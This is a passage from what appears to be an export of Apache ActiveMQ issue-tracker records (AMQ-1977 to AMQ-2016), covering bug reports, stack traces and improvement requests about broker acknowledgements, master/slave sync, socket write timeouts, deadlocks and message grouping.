org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport$8.onCompletion(DemandForwardingBridgeSupport.java:643) at org.apache.activemq.transport.FutureResponse.set(FutureResponse.java:61) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:97) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:202) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:184) at java.lang.Thread.run(Thread.java:619)INFO  DemandForwardingBridge         - Network connection between vm://query2.mag.ss.com#32 and tcp://query1.mag.ss.com/10.100.0.101:61616 shutdown due to a local error: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (730)ERROR Service                        - Async error occurred: javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (729)javax.jms.JMSException: Unmatched acknowledege: Expected message count (1) differs from count in dispatched-list (729) at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:445) at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:187) at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373) at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:194)...
issueID:AMQ-1977
type:Bug
changed files:
texts:org.apache.activemq.network.DuplexNetworkTest is unreliable - sometimes testFilter fails, sometimes hang on start
This test is unreliable, already has two xtests which hints that it may be hiding some issue.
issueID:AMQ-1978
type:Improvement
changed files:
texts:ActiveMQTextMessage toString() method to call getText()
Currently toString on newly consumed message shows text field has the null value, because getText is never called.
issueID:AMQ-1979
type:Bug
changed files:
texts:Temporary queue on slave not removed in Pure Master/Slave setup
Maybe not the most logical client code, but it happened here and I guess it will happen somewhere again:  TemporaryQueue reply = session.createTemporaryQueue();         MessageConsumer consumer = session.createConsumer(reply);  Message received = consumer.receive(timeout);  ...  reply.delete();  consumer.close();I"ve removed try/finally blocks to keep it simple.See the attached source code.It works fine, but set   JmsMessageHandler.REVERSE_ORDER=trueand the slave will not be cleaned up properly.It means that the number of threads is increasing and at some time it will get an OutOfMemoryError (see AMQ-1849) and the slave dies.
issueID:AMQ-1980
type:Improvement
changed files:MulticastDiscoveryAgent.java
texts:Read default discovery address from System property
We have different environments of the same application (test, QA, production) and they should not use each others JMS provider.I prefer to set the discovery address through a system property to have it set once for all brokers in the JVM.Does it make sense?JBoss does something similar. (but they have a range of addresses)I know it"s possible to set it in the config file.Also removed a duplicate "start - myHost"Or did that make sense?
issueID:AMQ-1981
type:Bug
changed files:
texts:After adding getText and getProperties in ActiveMQText.toString(), OpenWire ActiveMQTextMessageTests fail
The problem is that MarshallingSupport.readUTF8() method does not work well when provided byte sequence does not contain UTF8 String. It tries to read size from first two characters and throws heap size exception.So this will not work:  ActiveMQTextMessage msg = new ActiveMQTextMessage();  msg.setContent(new ByteSequence("test".getBytes()));  msg.getText();and this is used in tests to set content and marshalled properties of the message.
issueID:AMQ-1982
type:Bug
changed files:
texts:can&#39;t start AMQ 5.2.0RC2 on windows
I just downloaded apache-activemq-5.2.0-bin.zip dated 07-Oct-2008 17:12 from http://people.apache.org/~gtully/staging-repos/activemq-5.2.0/org/apache/activemq/apache-activemq/5.2.0/ and, after unpacking, it fails to start on my XP SP2 box. Output as below:ACTIVEMQ_HOME: D:Developmentactivemqapache-activemq-5.2.0in..ACTIVEMQ_BASE: D:Developmentactivemqapache-activemq-5.2.0in..Loading message broker from: xbean:activemq.xmlERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: Djava.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: D at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.activemq.console.Main.runTaskClass(Main.java:225) at org.apache.activemq.console.Main.main(Main.java:106)Caused by: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: D at org.springframework.beans.factory.config.PropertyResourceConfigurer.postProcessBeanFactory(PropertyResourceConfigurer.java:78) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:554) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:528) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:363) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52) at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115) at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74) ... 10 moreCaused by: java.net.UnknownHostException: D at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:177) at java.net.Socket.connect(Socket.java:518) at java.net.Socket.connect(Socket.java:468) at sun.net.NetworkClient.doConnect(NetworkClient.java:157) at sun.net.NetworkClient.openServer(NetworkClient.java:118) at sun.net.ftp.FtpClient.openServer(FtpClient.java:488) at sun.net.ftp.FtpClient.openServer(FtpClient.java:475) at sun.net.www.protocol.ftp.FtpURLConnection.connect(FtpURLConnection.java:270) at sun.net.www.protocol.ftp.FtpURLConnection.getInputStream(FtpURLConnection.java:352) at org.springframework.core.io.UrlResource.getInputStream(UrlResource.java:123) at org.springframework.core.io.support.PropertiesLoaderSupport.loadProperties(PropertiesLoaderSupport.java:182) at org.springframework.core.io.support.PropertiesLoaderSupport.mergeProperties(PropertiesLoaderSupport.java:161) at org.springframework.beans.factory.config.PropertyResourceConfigurer.postProcessBeanFactory(PropertyResourceConfigurer.java:69) ... 21 moreERROR: java.lang.Exception: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: Djava.lang.Exception: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: D at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129) at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57) at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.apache.activemq.console.Main.runTaskClass(Main.java:225) at org.apache.activemq.console.Main.main(Main.java:106)Caused by: org.springframework.beans.factory.BeanInitializationException: Could not load properties; nested exception is java.net.UnknownHostException: D at org.springframework.beans.factory.config.PropertyResourceConfigurer.postProcessBeanFactory(PropertyResourceConfigurer.java:78) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:554) at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:528) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:363) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64) at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52) at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96) at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71) at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54) at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115) at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74) ... 10 moreCaused by: java.net.UnknownHostException: D at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:177) at java.net.Socket.connect(Socket.java:518) at java.net.Socket.connect(Socket.java:468) at sun.net.NetworkClient.doConnect(NetworkClient.java:157) at sun.net.NetworkClient.openServer(NetworkClient.java:118) at sun.net.ftp.FtpClient.openServer(FtpClient.java:488) at sun.net.ftp.FtpClient.openServer(FtpClient.java:475) at sun.net.www.protocol.ftp.FtpURLConnection.connect(FtpURLConnection.java:270) at sun.net.www.protocol.ftp.FtpURLConnection.getInputStream(FtpURLConnection.java:352) at org.springframework.core.io.UrlResource.getInputStream(UrlResource.java:123) at org.springframework.core.io.support.PropertiesLoaderSupport.loadProperties(PropertiesLoaderSupport.java:182) at org.springframework.core.io.support.PropertiesLoaderSupport.mergeProperties(PropertiesLoaderSupport.java:161) at org.springframework.beans.factory.config.PropertyResourceConfigurer.postProcessBeanFactory(PropertyResourceConfigurer.java:69) ... 21 moreSounds like a path issue? See http://www.mail-archive.com/users@maven.apache.org/msg09111.htmlI also tried downloading the .tar.gz and trying that in cygwin but same result
issueID:AMQ-1983
type:Bug
changed files:MasterBroker.java
texts:Async error occurred - Slave broker out of sync with master
I have tried to reduce the real-life problem to something smaller. See activemqjee-0.0.8.tar.gzIt"s a MDB that forwards a message to another queue. What I did: send some messages to queue.A (I did 10 at a time, using the webconsole setting Persistent Delivery) the MDB sends each message to queue.B if a reply queue was set in the message, the MDB sends a replyOn queue.B is an MDB that just received and logs the message.Logged on the master:2008-10-19 18:39:54,114 [127.0.0.1:43972] DEBUG AMQMessageStore                - Journalled transacted message add for:   ID:selten.cluster-40744-1224434310420-0:2:4:1:1, at: offset = 90045, file = 1, size = 429, type = 1......2008-10-19 18:39:54,278 [127.0.0.1:43972] DEBUG AMQMessageStore                - Transacted message add commit for:   ID:selten.cluster-40744-1224434310420-0:2:4:1:1, at: offset = 90045, file = 1, size = 429, type = 1......2008-10-19 18:39:54,305 [127.0.0.1:43962] ERROR MasterBroker                   - Slave Failedjavax.jms.JMSException: Unmatched acknowledege: MessageAck {commandId = 1031, responseRequired = true, ackType = 2,   consumerId = ID:selten.cluster-40744-1224434310420-0:0:-1:2, firstMessageId = ID:selten.cluster-40744-1224434310420-0:2:4:1:1, lastMessageId = ID:selten.cluster-40744-1224434310420-0:2:4:1:1,   destination = queue://queue.B, transactionId = XID:131075:312d2d32613062356562303a613535653a34386662363236643a313135:2d32613062356562303a613535653a34386662363236643a313136, messageCount = 1}; Could not find Message-ID ID:selten.cluster-40744-1224434310420-0:2:4:1:1 in dispatched-list (start of ack)        at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:438)        at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:188)        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:373)        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:462)Logged on the slave:2008-10-19 18:39:54,112 [.cluster#1] DEBUG AMQMessageStore                - Journalled transacted message add for: ID:selten.cluster-40744-1224434310420-0:2:4:1:1, at: offset = 90045, file = 1, size = 429, type = 1......2008-10-19 18:39:54,241 [.cluster#1] DEBUG AMQMessageStore                - Transacted message add commit for: ID:selten.cluster-40744-1224434310420-0:2:4:1:1, at: offset = 90045, file = 1, size = 429, type = 1......2008-10-19 18:39:54,288 [.cluster#1] ERROR Service                        - Async error occurred: javax.jms.JMSException: Slave broker out of sync with master:   Dispatched message (ID:selten.cluster-40744-1224434310420-0:2:4:1:1) was not in the pending list for queue.B  javax.jms.JMSException: Slave broker out of sync with master: Dispatched message (ID:selten.cluster-40744-1224434310420-0:2:4:1:1) was not in the pending list for queue.B        at org.apache.activemq.broker.region.PrefetchSubscription.processMessageDispatchNotification(PrefetchSubscription.java:175)        at org.apache.activemq.broker.region.AbstractRegion.processDispatchNotification(AbstractRegion.java:414)        at org.apache.activemq.broker.region.RegionBroker.processDispatchNotification(RegionBroker.java:585)I could not consistently reproduce it with a single JBoss server running. I"ve sent a few 100 messages without any problem.I"ve tested both 5.2.0-RC2 and 5.3.0-SNAPSHOT (rev 706043).
issueID:AMQ-1984
type:Improvement
changed files:
texts:Intermittent failure of test org.apache.activemq.transport.failover.ReconnectTest
Tests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 54.76 sec <<< FAILURE!testReconnects(org.apache.activemq.transport.failover.ReconnectTest)  Time elapsed: 54.741 sec  <<< FAILURE!junit.framework.AssertionFailedError: Test run 7: Worker 6 never completed an interation.        at junit.framework.Assert.fail(Assert.java:47)        at junit.framework.Assert.assertTrue(Assert.java:20)        at org.apache.activemq.transport.failover.ReconnectTest.testReconnects(ReconnectTest.java:180)
issueID:AMQ-1986
type:Task
changed files:
texts:Upgrade to Camel 1.5 when its released
None
issueID:AMQ-1989
type:Bug
changed files:
texts:STOMP - transaction header is not removed from messages received in a transaction
There is no need to keep this information in a message. This can make a problem if client tries to ack a message from other transaction (and just copy all headers from the message).
issueID:AMQ-1993
type:Bug
changed files:TcpBufferedOutputStream.java
texts:Systems hang due to inability to timeout socket write operation
the blocking Java Socket API doesn"t have a timeout on socketWrite invocations.This means, if a TCP session is dropped or terminated without RST or FIN packets, the operating system it left to eventually time out the session. On the linux kernel this timeout usually takes 15 to 30minutes. For this entire period, the AMQ server hangs, and producers and consumers are unable to use a topic.I have created two patches for this at the page:http://www.hanik.com/covalent/amq/index.htmlLet me show a bit more---------------------------------"ActiveMQ Transport: tcp:///X.YYY.XXX.ZZZZ:2011" daemon prio=10 tid=0x0000000055d39000 nid=0xc78 runnable &#91;0x00000000447c9000..0x00000000447cac10&#93;   java.lang.Thread.State: RUNNABLE at java.net.SocketOutputStream.socketWrite0(Native Method) at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)This is a thread stuck in blocking IO, and can be stuck for 30 minutes during the kernel TCP retransmission attempts.Unfortunately the thread dump is very misleading since the name of the thread, is not the destination or even remotely related to the socket it is operating on.To mend this, a very simple (and configurable) ThreadNameFilter has been suggested to the patch, that appends the destination and helps the system administrator correctly identify the client that is about to receive data. ----------------------------------- at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:581) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:421) locked <0x00002aaaec155818> (a org.apache.activemq.broker.region.Topic) at org.apache.activemq.broker.region.Topic.send(Topic.java:363)The lock being held at this issue unfortunately makes the entire Topic single threaded. When this lock is being held, no other clients (producers and consumers) can publish to/receive from this topic.And this lock can hold up to 30 minutes.I consider solving this single threaded behavior a "feature enhancement" that should be handled separately from this bug. Because even if it is solved, threads still risk being stuck in socketWrite0 for dropped connections that still appear to be established.For this, I have implemented a socket timeout filter, based on a TransportFilter, this filter only times out connections that are actually writing data.The two patches are at:http://www.hanik.com/covalent/amq/patch-1-threadname-filter.patchhttp://www.hanik.com/covalent/amq/patch-3-tcp-writetimeout.patchthe binary 0000.jar applies to both 5.1 and trunk and can be used today in existing environments.
issueID:AMQ-1995
type:Bug
changed files:
texts:Exception "The Consumer is closed" in multithreaded environment
I got the following exception when running the TempQueueMemoryTest and increasing number of producer, consumers and messages:javax.jms.IllegalStateException: The Consumer is closed at org.apache.activemq.ActiveMQMessageConsumer.checkClosed(ActiveMQMessageConsumer.java:699) at org.apache.activemq.ActiveMQMessageConsumer.getMessageListener(ActiveMQMessageConsumer.java:339) at org.apache.activemq.ActiveMQSession.checkMessageListener(ActiveMQSession.java:1864) at org.apache.activemq.ActiveMQMessageConsumer.checkMessageListener(ActiveMQMessageConsumer.java:717) at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:457) at TempQueueMemoryTest$1Producer.run(TempQueueMemoryTest.java:94)The error happens at "Message reply = consumer.receive();", the message is not received.I increased the number of consumers and produceres to 2 and the number of messages to 5000. When using larger numbers the exception is thrown more often (unpredictable how often exactly). It definitly seems to be a multithreading-related problem because it only happens with multiple threads producing/consuming and the more threads you have the more often it happens.Tested with 5.2 RC2.
issueID:AMQ-1998
type:Bug
changed files:KahaPersistenceAdapter.java
AMQPersistenceAdapter.java
texts:Cannot delete Queue via JMX or admin console
When I delete a queue via JMX and the admin console and restart the broker, the queue is still present. Here are the precise steps to reproduce the problem : 1. Start the broker2. Started jconsole 3. With the Broker MBean, create a queue named "JMX.queue" (addQueue operation)4. With this queue"s MBean, send a text message (sendTextMessage operation)5. With the Broker MBean, remove the queue (removeQueue operation). The queue"s MBean is also deleted. 6. Restart the broker. 7. When reconnecting with JConsole, the queue"s MBean is still present. This is also the case with the Web admin console. I"m using the default config of the 5.1.0 distribution.
issueID:AMQ-2002
type:Bug
changed files:StoreDurableSubscriberCursor.java
texts:Handling messages with a store-based message cursor will hang producers
When memory of the broker reaches its limit, the store-based cursor will page messages to temporary files or store them to a database ,thus the producer can send messages again. But if we set the destination policy with a low limit of memory, the producer will be hung because the store-based cursor will do nothing. I have attached a junit test case to show these diverse results.
issueID:AMQ-2003
type:New Feature
changed files:StompFrame.java
texts:Create Simple Java Stomp client
This is something we must have mostly for our testing purposes. Writing complex Stomp test cases is tedious and results in unreadable tests. Part from that, a few users asked for one, so it would be good to have it.I"ve started work on it, basically adding methods to StompConnection class (which will be moved from "test" to "main" tree). We also need an easy way to parse Stomp frames from strings, so we can check frames broker returns and extract headers such as message-id. I"ll add a method in StompFrame for that.
issueID:AMQ-2004
type:Bug
changed files:
texts:Duplicate delivery acks on failover with transacted delivery - Async error on broker - TX has not started error on ack
On failover transport resume, outstanding acks are delivered async. Regular consumption also delivers acks which can result in out of order delivery of outstanding delivery acks. the async delivery can occur after the regular delivery.org.apache.activemq.transport.failover.AMQ1925Test.testAMQ1925_TXBegin modified to fail on a connection exception demonstrates this behaviour.Solution seems to be  to only deliver outstanding standard acks during deliverAcks.
issueID:AMQ-2005
type:Bug
changed files:AsyncDataManager.java
JournalPersistenceAdapter.java
ActiveMQSession.java
ActiveMQMessageConsumer.java
Scheduler.java
TimedSubscriptionRecoveryPolicy.java
PrefetchSubscription.java
AMQPersistenceAdapter.java
texts:javax.jms.JMSException: Timer already cancelled.
Occasionally from:IndividualDeadLetterViaXmlTest.testDurableTopicMessage  (org.apache.activemq.broker.policy)javax.jms.JMSException: Timer already cancelled.at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)at org.apache.activemq.TransactionContext.afterRollback(TransactionContext.java:138)at org.apache.activemq.TransactionContext.rollback(TransactionContext.java:237)at org.apache.activemq.ActiveMQSession.rollback(ActiveMQSession.java:522)at org.apache.activemq.broker.policy.DeadLetterTest.consumeAndRollback(DeadLetterTest.java:68)at org.apache.activemq.broker.policy.DeadLetterTest.doTest(DeadLetterTest.java:52)at org.apache.activemq.broker.policy.DeadLetterTestSupport.testDurableTopicMessage(DeadLetterTestSupport.java:154)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:585)at junit.framework.TestCase.runTest(TestCase.java:154)at junit.framework.TestCase.runBare(TestCase.java:127)at junit.framework.TestResult$1.protect(TestResult.java:106)at junit.framework.TestResult.runProtected(TestResult.java:124)at junit.framework.TestResult.run(TestResult.java:109)at junit.framework.TestCase.run(TestCase.java:118)at junit.framework.TestSuite.runTest(TestSuite.java:208)at junit.framework.TestSuite.run(TestSuite.java:203)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:585)at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:210)at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:135)at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:160)at org.apache.maven.surefire.Surefire.run(Surefire.java:81)at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)at java.lang.reflect.Method.invoke(Method.java:585)at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:182)at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:743)Caused by: java.lang.IllegalStateException: Timer already cancelled.at java.util.Timer.sched(Timer.java:354)at java.util.Timer.schedule(Timer.java:170)at org.apache.activemq.thread.Scheduler.executeAfterDelay(Scheduler.java:52)at org.apache.activemq.ActiveMQMessageConsumer.rollback(ActiveMQMessageConsumer.java:972)at org.apache.activemq.ActiveMQMessageConsumer$4.afterRollback(ActiveMQMessageConsumer.java:832)at org.apache.activemq.TransactionContext.afterRollback(TransactionContext.java:133)... 31 more
issueID:AMQ-2006
type:Improvement
changed files:WriteTimeoutFilter.java
texts:Improve timeout filter due to dead lock risk
Some of the filters in activeMQ are dead lock prone, hence aborting a write must be done directly at the socket level without the risk of involving any additional locksThis patch is to trunk, and is an improvement over the original inhttps://issues.apache.org/activemq/browse/AMQ-1993This patch also acts like a tab police, I"m still a eclipse newbie.
issueID:AMQ-2013
type:Task
changed files:
texts:exclude xom dependency from xstream
xom is an optional dependency of xstream. I"m going to exclude this since its LGPL.
issueID:AMQ-2014
type:Bug
changed files:
texts:Stock portfolio Ajax example does not work
The page doesn"t get refreshed like no messages are being received.
issueID:AMQ-2015
type:Bug
changed files:AbstractRegion.java
texts:Deadlock in activemq, seems to occur on startup when clients are attempting to connect
This seems to happen when I start up the instance up and clients are attempting to connect (e.g. after a live restart)...though I cannot consistently verify that. It gets into a deadlock state. If I look at the queues on the web monitor, it shows that only one has been created (of the ~30 that the connecting clients will attempt to recreate). Connections are being opened both over openwire (about 30) and stomp+ssl( a few hundred). Thread dump and a copy of activemq.xml is attached.
issueID:AMQ-2016
type:Bug
changed files:QueueDispatchSelector.java
Queue.java
texts:Message grouping not honored when consumers started with existing messages
Messages are processed FIFO when messages with different groups are sent to a queue and then the consumers are started. If the messages are sent after the consumers are started, then message grouping works as expected.Two JUnit tests are attached. 1. MessageGroupTest.java starts up 3 consumers and then sends 30 messages evenly distributed across 3 groups A, B, and C. Each consumer then gets assigned a group and the ordering is as expected based on the different sleep intervals defined as seen in the log below2008-11-26 15:06:09,841 INFO  &#91;main&#93; &#91;com.test.MessageGroupTest&#93; 30 messages sent to group A/B/C2008-11-26 15:06:09,841 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 92008-11-26 15:06:09,841 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 92008-11-26 15:06:09,841 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 92008-11-26 15:06:09,934 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 82008-11-26 15:06:10,044 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 72008-11-26 15:06:10,137 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 62008-11-26 15:06:10,247 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 52008-11-26 15:06:10,340 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 42008-11-26 15:06:10,450 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 32008-11-26 15:06:10,544 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 22008-11-26 15:06:10,653 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 12008-11-26 15:06:10,747 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupTest&#93; worker3 received msg C remaining 02008-11-26 15:06:10,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 82008-11-26 15:06:11,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 72008-11-26 15:06:12,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 62008-11-26 15:06:13,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 52008-11-26 15:06:14,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 82008-11-26 15:06:14,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 42008-11-26 15:06:15,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 32008-11-26 15:06:16,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 22008-11-26 15:06:17,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 12008-11-26 15:06:18,840 INFO  &#91;Thread-2&#93; &#91;com.test.MessageGroupTest&#93; worker1 received msg B remaining 02008-11-26 15:06:19,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 72008-11-26 15:06:24,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 62008-11-26 15:06:29,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 52008-11-26 15:06:34,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 42008-11-26 15:06:39,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 32008-11-26 15:06:44,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 22008-11-26 15:06:49,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 12008-11-26 15:06:54,840 INFO  &#91;Thread-3&#93; &#91;com.test.MessageGroupTest&#93; worker2 received msg A remaining 02. MessageGroupDelayedTest.java sends 30 messages evenly distributed across 3 groups A, B, and C and then starts up 3 consumers.All 30 messages are delivered in FIFO order to a single consumer as seen in the log below2008-11-26 15:25:50,021 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg A remaining 92008-11-26 15:25:55,021 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg B remaining 92008-11-26 15:25:56,021 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; worker3 received msg C remaining 92008-11-26 15:25:56,130 INFO  &#91;Thread-4&#93; &#91;com.test.MessageGroupDelayedTest&#93; 